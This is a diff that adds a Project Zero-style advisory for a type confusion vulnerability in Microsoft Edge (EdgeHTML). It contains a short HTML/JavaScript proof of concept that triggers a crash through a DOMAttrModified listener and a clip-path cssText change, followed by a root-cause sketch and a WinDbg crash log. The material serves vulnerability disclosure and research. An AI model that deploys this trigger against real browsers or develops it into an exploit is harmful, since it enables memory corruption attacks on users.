@@ -1,0 +1,111 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1254
+
+There is a type confusion vulnerability in Microsoft Edge. The vulnerability has been confirmed on Windows 10 Enterprise 64-bit (OS version 1607, OS build 14393.1198) and Microsoft Edge 38.14393.1066.0, Microsoft EdgeHTML 14.14393.
+
+PoC
+
+==========================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<script>
+function go() {
+  window.addEventListener("DOMAttrModified", undefined);
+  m.style.cssText = "clip-path: url(#foo);";
+}
+</script>
+<body onload=go()>
+<meter id="m" value="a" frame="below">
+
+<!--
+=========================================
+
+Preliminary analysis:
+
+The crash happens inside CAttrArray::PrivateFindInl. Rcx (this) pointer is supposed to point to a CAttrArray but it actually pointa to a CAttribute. CAttrArray::PrivateFindInl is only going to perform reads and its return value is going to be discarded by the calling function (CAttrArray::SetParsed). However the actual type confusion happens further down the stack (possibly inside CssParser::RecordProperty) and if CAttrArray::PrivateFindInl returns false (can be controlled by an attacker), then CAttrArray::Set is going to also be called with the wrong type, which might lead to more serious consequences.
+
+Crash log (Note: crash log is obtained from an older Edge version as the symbols for the up-to date version are no longer available).
+
+=========================================
+
+(1b24.f18): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+edgehtml!CAttrArray::PrivateFindInl+0xd6:
+00007ffa`64acf836 41f644d00380    test    byte ptr [r8+rdx*8+3],80h ds:00000003`0005ffbe=??
+0:009> k
+ # Child-SP          RetAddr           Call Site
+00 000000ab`02efb3f0 00007ffa`64c9ee99 edgehtml!CAttrArray::PrivateFindInl+0xd6
+01 000000ab`02efb420 00007ffa`64bc795b edgehtml!CAttrArray::SetParsed+0x49
+02 000000ab`02efb490 00007ffa`64bc96dc edgehtml!CssParser::RecordProperty+0x24b
+03 000000ab`02efb500 00007ffa`64bc83dc edgehtml!CssParser::HandleSingleDeclaration+0x21c
+04 000000ab`02efb580 00007ffa`64b5d2cb edgehtml!CssParser::HandleDeclaration+0x9c
+05 000000ab`02efb5b0 00007ffa`64b5debe edgehtml!CssParser::Write+0x3b
+06 000000ab`02efb5f0 00007ffa`64a1c60c edgehtml!ProcessCSSText+0x112
+07 000000ab`02efb670 00007ffa`64a357e3 edgehtml!CStyle::SetCssText+0xbc
+08 000000ab`02efb6b0 00007ffa`64d22235 edgehtml!CFastDOM::CCSSStyleDeclaration::Trampoline_Set_cssText+0x77
+09 000000ab`02efb700 00007ffa`63886d07 edgehtml!CFastDOM::CCSSStyleDeclaration::Profiler_Set_cssText+0x25
+0a 000000ab`02efb730 00007ffa`63962640 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x177
+0b 000000ab`02efb810 00007ffa`63a02209 chakra!Js::LeaveScriptObject<1,1,0>::LeaveScriptObject<1,1,0>+0x180
+0c 000000ab`02efb860 00007ffa`6392475e chakra!Js::JavascriptOperators::CallSetter+0xa9
+0d 000000ab`02efb900 00007ffa`639ef932 chakra!Js::JavascriptOperators::SetProperty_Internal<0>+0x4de
+0e 000000ab`02efb9c0 00007ffa`639ef86f chakra!Js::JavascriptOperators::OP_SetProperty+0xa2
+0f 000000ab`02efba10 00007ffa`63986ddb chakra!Js::JavascriptOperators::PatchPutValueWithThisPtrNoFastPath+0x9f
+10 000000ab`02efba90 00007ffa`63929a70 chakra!Js::ProfilingHelpers::ProfiledStFld<0>+0x1cb
+11 000000ab`02efbb60 00007ffa`6392e800 chakra!Js::InterpreterStackFrame::OP_ProfiledSetProperty<Js::OpLayoutT_ElementCP<Js::LayoutSizePolicy<0> > const >+0x70
+12 000000ab`02efbbb0 00007ffa`6392c852 chakra!Js::InterpreterStackFrame::ProcessProfiled+0x340
+13 000000ab`02efbc40 00007ffa`63930920 chakra!Js::InterpreterStackFrame::Process+0x142
+14 000000ab`02efbca0 00007ffa`63932065 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x4a0
+15 000000ab`02efc000 00000219`30f30fb2 chakra!Js::InterpreterStackFrame::InterpreterThunk+0x55
+16 000000ab`02efc050 00007ffa`63a17273 0x00000219`30f30fb2
+17 000000ab`02efc080 00007ffa`63925763 chakra!amd64_CallFunction+0x93
+18 000000ab`02efc0d0 00007ffa`63928260 chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+19 000000ab`02efc130 00007ffa`6392ccfd chakra!Js::InterpreterStackFrame::OP_CallI<Js::OpLayoutDynamicProfile<Js::OpLayoutT_CallI<Js::LayoutSizePolicy<0> > > >+0x110
+1a 000000ab`02efc180 00007ffa`6392c8b7 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x32d
+1b 000000ab`02efc210 00007ffa`63930920 chakra!Js::InterpreterStackFrame::Process+0x1a7
+1c 000000ab`02efc270 00007ffa`63932065 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x4a0
+1d 000000ab`02efc5c0 00000219`30f30fba chakra!Js::InterpreterStackFrame::InterpreterThunk+0x55
+1e 000000ab`02efc610 00007ffa`63a17273 0x00000219`30f30fba
+1f 000000ab`02efc640 00007ffa`63925763 chakra!amd64_CallFunction+0x93
+20 000000ab`02efc690 00007ffa`6395a4bc chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+21 000000ab`02efc6f0 00007ffa`63959a86 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x104
+22 000000ab`02efc7e0 00007ffa`639fc359 chakra!Js::JavascriptFunction::CallRootFunction+0x4a
+23 000000ab`02efc850 00007ffa`6395ff21 chakra!ScriptSite::CallRootFunction+0xb5
+24 000000ab`02efc8f0 00007ffa`6395badc chakra!ScriptSite::Execute+0x131
+25 000000ab`02efc980 00007ffa`64be08dd chakra!ScriptEngineBase::Execute+0xcc
+26 000000ab`02efca20 00007ffa`64be0828 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
+27 000000ab`02efca70 00007ffa`64b1a8c7 edgehtml!CJScript9Holder::ExecuteCallback+0x18
+28 000000ab`02efcab0 00007ffa`64b1a6b7 edgehtml!CListenerDispatch::InvokeVar+0x1fb
+29 000000ab`02efcc30 00007ffa`64bdf22a edgehtml!CListenerDispatch::Invoke+0xdb
+2a 000000ab`02efccb0 00007ffa`64cb40d2 edgehtml!CEventMgr::_InvokeListeners+0x2ca
+2b 000000ab`02efce10 00007ffa`64b30ac5 edgehtml!CEventMgr::_InvokeListenersOnWindow+0x66
+2c 000000ab`02efce40 00007ffa`64b30553 edgehtml!CEventMgr::Dispatch+0x405
+2d 000000ab`02efd110 00007ffa`64c0d8da edgehtml!CEventMgr::DispatchEvent+0x73
+2e 000000ab`02efd160 00007ffa`64c4ba12 edgehtml!COmWindowProxy::Fire_onload+0x14e
+2f 000000ab`02efd270 00007ffa`64c4a6a6 edgehtml!CMarkup::OnLoadStatusDone+0x376
+30 000000ab`02efd330 00007ffa`64c4a21f edgehtml!CMarkup::OnLoadStatus+0x112
+31 000000ab`02efd360 00007ffa`64bd5b43 edgehtml!CProgSink::DoUpdate+0x3af
+32 000000ab`02efd7f0 00007ffa`64bd7300 edgehtml!GlobalWndOnMethodCall+0x273
+33 000000ab`02efd8f0 00007ffa`7f751c24 edgehtml!GlobalWndProc+0x130
+34 000000ab`02efd9b0 00007ffa`7f75156c user32!UserCallWinProcCheckWow+0x274
+35 000000ab`02efdb10 00007ffa`75cecdf1 user32!DispatchMessageWorker+0x1ac
+36 000000ab`02efdb90 00007ffa`75cec3b1 EdgeContent!CBrowserTab::_TabWindowThreadProc+0x4a1
+37 000000ab`02effde0 00007ffa`768f9596 EdgeContent!LCIETab_ThreadProc+0x2c1
+38 000000ab`02efff00 00007ffa`81538364 iertutil!SettingStore::CSettingsBroker::SetValue+0x246
+39 000000ab`02efff30 00007ffa`81b170d1 KERNEL32!BaseThreadInitThunk+0x14
+3a 000000ab`02efff60 00000000`00000000 ntdll!RtlUserThreadStart+0x21
+0:009> r
+rax=0000000000003ffd rbx=0000000000000002 rcx=0000021128e64cf0
+rdx=000000000000bff7 rsi=0000000000003ffd rdi=0000000000000000
+rip=00007ffa64acf836 rsp=000000ab02efb3f0 rbp=0000000000000002
+ r8=0000000300000003  r9=00000000800114a4 r10=0000000000000000
+r11=0000000000007ffa r12=0000021932328fe0 r13=0000021127f66f01
+r14=0000021128e64c88 r15=0000000000000000
+iopl=0         nv up ei pl nz na pe nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+edgehtml!CAttrArray::PrivateFindInl+0xd6:
+00007ffa`64acf836 41f644d00380    test    byte ptr [r8+rdx*8+3],80h ds:00000003`0005ffbe=??
+
+=========================================
+-->
